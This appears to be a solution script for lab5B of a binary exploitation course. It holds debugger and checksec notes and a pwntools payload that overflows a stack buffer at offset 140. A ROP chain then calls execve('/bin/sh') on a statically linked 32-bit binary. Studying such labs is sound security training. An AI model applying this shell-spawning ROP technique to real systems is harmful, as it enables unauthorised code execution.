# -*- coding: utf-8 -*-
#
# There is no libc --static (no dynamic libs)
'''
gdb-peda$ vmmap libc
Warning: not found or cannot access procfs
gdb-peda$ p system
No symbol table is loaded.  Use the "file" command.
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Not found
❯ file lab5B
lab5B: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=aa2cfc897996baf486fb4e7293537a7308fe7a98, for GNU/Linux 3.2.0, not stripped
'''
# NX on
'''
❯ checksec lab5B
[*] '/home/karmaz/MBE/lab5/lab5B'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
'''
# EIP @ 140
'''
0x41416d41 in ?? ()
gdb-peda$ pattern offset 0x41416d41
1094806849 found at offset: 140
'''
# Build a shellcode via ROP gadgets
'''
system("/bin/sh") shellcode:

section .data
    msg db '/bin/sh'    => "/bin/sh\x00" - addr from buffer 

section .text
    global _start       

_start:
    mov eax, 11         => 11 * inc eax ; ret 
    mov ebx, msg        => pop ebx => [addr_of_shellcode[0]]
    mov ecx, 0          => mov ecx, eax ; mov eax, ecx ; ret
    int 0x80            => int 0x80


ROPS:
0x0806cb7d : xor eax, eax ; pop ebx ; ret
0x08093488 : mov ecx, eax ; mov eax, ecx ; ret
0x0807fffe : inc eax ; ret 
0x0804a3a2 : int 0x80

'''
# Exploit
from pwn import *

buf = "/bin/sh\x00" + "A" * 132
buf += p32(0x0806cb7d)      # xor eax, eax ; pop ebx ; ret
buf += p32(0xffffce40)      # addr_shellcode[0]
buf += p32(0x08093488)      # ecx = eax = 0
buf += p32(0x0807fffe) *11  # eax = 11
buf += p32(0x0804a3a2)      # int 0x80


print buf